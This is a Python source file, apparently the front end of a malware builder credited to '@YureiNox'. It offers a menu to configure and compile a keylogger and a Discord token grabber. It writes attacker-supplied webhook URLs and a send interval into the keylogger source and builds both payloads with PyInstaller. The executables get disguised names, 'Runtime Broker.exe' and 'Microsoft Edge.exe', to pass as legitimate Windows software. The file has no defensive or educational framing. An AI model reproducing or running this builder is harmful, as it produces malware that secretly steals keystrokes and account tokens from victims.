import os
import sys
import shutil
import threading
import subprocess
from time import sleep
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()
keylogger = r"tools\keylog.py"
discord_token_grabber = r"tools\grabber.py"
clear_command = "cls" if os.name == "nt" else "clear"
modules = ["requests", "psutil", "keyboard", "auto-py-to-exe", "rich"]

def run_hidden(cmd):
    # Runs a command and hides its output
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def check_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        console.print(f"[yellow]Module '{module_name}' not found. Installing...[/yellow]")
        run_hidden(f"pip install {module_name}")

def check_all_modules():
    for m in modules:
        check_module(m)

def ascii_header():
    header = r"""
_____.___.                    .__ _______                
\__  |   |__ _________   ____ |__|\      \   _______  ___
 /   |   |  |  \_  __ \_/ __ \|  |/   |   \ /  _ \  \/  /
 \____   |  |  /|  | \/\  ___/|  /    |    (  <_> >    < 
 / ______|____/ |__|    \___  >__\____|__  /\____/__/\_ \
 \/                         \/           \/            \/
By: @YureiNox
"""
    console.print(f"[bold cyan]{header}[/bold cyan]")

def loading_animation(task, desc="Loading..."):
    done = [False]
    def animate():
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
            console=console
        ) as progress:
            t = progress.add_task(desc, total=None)
            while not done[0]:
                sleep(0.1)
            progress.remove_task(t)
    thread = threading.Thread(target=animate)
    thread.start()
    task()
    done[0] = True
    thread.join()

def keylogger_setup():
    os.system(clear_command)
    ascii_header()
    webhook1 = console.input("[bold]Enter your first webhook URL:[/bold] ").strip()
    loading_animation(lambda: sleep(0.5), "Loading first webhook URL...")
    webhook2 = console.input("[bold]Enter your second webhook URL:[/bold] ").strip()
    loading_animation(lambda: sleep(0.5), "Loading second webhook URL...")
    if not webhook1 or not webhook2:
        console.print("[red]Webhook URLs cannot be empty.[/red]")
        loading_animation(lambda: sleep(1.5), "Returning...")
        return
    try:
        with open(keylogger, "r", encoding="utf-8") as f:
            data = f.read()
        data = data.replace('WEBHOOKS = [None, None]', f'WEBHOOKS = ["{webhook1}", "{webhook2}"]')
        with open(keylogger, "w", encoding="utf-8") as f:
            f.write(data)
        console.print("[green]Keylogger webhook URLs set successfully.[/green]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        loading_animation(lambda: sleep(1.5), "Returning...")
        return
    while True:
        time_interval = console.input("[bold]Enter the time interval (in minutes) for sending logs:[/bold] ").strip()
        loading_animation(lambda: sleep(0.5), "Loading time interval...")
        if time_interval.isdigit() and int(time_interval) > 0:
            break
        console.print("[yellow]Please enter a valid positive integer.[/yellow]")
    try:
        with open(keylogger, "r", encoding="utf-8") as f:
            data_time = f.read()
        data_time = data_time.replace('timedelta(minutes=None)', f'timedelta(minutes={time_interval})')
        with open(keylogger, "w", encoding="utf-8") as f:
            f.write(data_time)
        console.print("[green]Keylogger time interval set successfully.[/green]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        loading_animation(lambda: sleep(1.5), "Returning...")
        return
    def compile_task():
        try:
            console.print("[yellow]Uninstalling keyboard module...[/yellow]")
            run_hidden("pip uninstall keyboard -y")
            console.print("[yellow]Installing keyboard module from folder...[/yellow]")
            os.chdir("tools")
            console.print("[yellow]Compiling keylog.py with folder...[/yellow]")
            run_hidden("pyinstaller \"keylogger.spec\"")
            os.chdir("..")
            console.print("[yellow]Moving compiled file...[/yellow]")
            shutil.move(os.path.join("tools", "dist", "Runtime Broker.exe"), "Runtime Broker.exe")
            console.print("[yellow]Cleaning up...[/yellow]")
            shutil.rmtree(os.path.join("tools", "build"), ignore_errors=True)
            shutil.rmtree(os.path.join("tools", "dist"), ignore_errors=True)
        except Exception as e:
            console.print(f"[red]Error during compilation: {e}[/red]")
    console.print("[cyan]Compiling...[/cyan]")
    loading_animation(compile_task, "Compiling Keylogger...")
    console.print("[green]Keylogger compiled successfully.[/green]")
    console.print("[yellow]Restoring original keylogger file...[/yellow]")
    try:
        with open(keylogger, "r", encoding="utf-8") as f:
            data = f.read()
        data = data.replace(f'WEBHOOKS = ["{webhook1}", "{webhook2}"]', 'WEBHOOKS = [None, None]')
        data = data.replace(f'timedelta(minutes={time_interval})', 'timedelta(minutes=None)')
        with open(keylogger, "w", encoding="utf-8") as f:
            f.write(data)
        console.print("[green]Keylogger file restored successfully.[/green]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        loading_animation(lambda: sleep(1.5), "Returning...")
        return
    console.print("[yellow]Please run the compiled file with webhook after to start the keylogger.[/yellow]")
    loading_animation(lambda: sleep(2.5), "Returning to menu...")

def discord_token_grabber_setup():
    os.system(clear_command)
    ascii_header()
    console.print("[bold magenta]Setting up Discord Token Grabber...[/bold magenta]")
    loading_animation(lambda: sleep(1.2), "Setting up...")
    def compile_task():
        try:
            os.chdir("tools")
            console.print("[yellow]Compiling grabber.py...[/yellow]")
            run_hidden("pyinstaller \"grabber.spec\"")
            os.chdir("..")
            shutil.move(os.path.join("tools", "dist", "Microsoft Edge.exe"), "Microsoft Edge.exe")
            console.print("[yellow]Cleaning up...[/yellow]")
            shutil.rmtree(os.path.join("tools", "build"), ignore_errors=True)
            shutil.rmtree(os.path.join("tools", "dist"), ignore_errors=True)
        except Exception as e:
            console.print(f"[red]Error during compilation: {e}[/red]")
    
    console.print("[cyan]Compiling...[/cyan]")
    loading_animation(compile_task, "Compiling Discord Token Grabber...")
    console.print("[green]Discord Token Grabber compiled successfully.[/green]")
    console.print("[yellow]Please run the compiled file with webhook after to start the grabber.[/yellow]")
    loading_animation(lambda: sleep(2.5), "Returning to menu...")

def menu():
    os.system(clear_command)
    ascii_header()
    menu_art = """
[1] - Keylogger
[2] - Discord Token Grabber
[3] - Exit
"""
    loading_animation(lambda: sleep(0.7), "Loading menu...")
    console.print(menu_art, style="bold white")
    choice = console.input("[bold cyan]Enter your choice:[/bold cyan] ").strip()
    if choice == "1":
        keylogger_setup()
    elif choice == "2":
        discord_token_grabber_setup()
    elif choice == "3":
        console.print("[yellow]Exiting...[/yellow]")
        loading_animation(lambda: sleep(1), "Please wait...")
        sys.exit()
    else:
        console.print("[red]Invalid choice. Please try again.[/red]")
        loading_animation(lambda: sleep(1), "Returning...")

if __name__ == "__main__":
    loading_animation(check_all_modules, "Checking modules...")
    while True:
        menu()
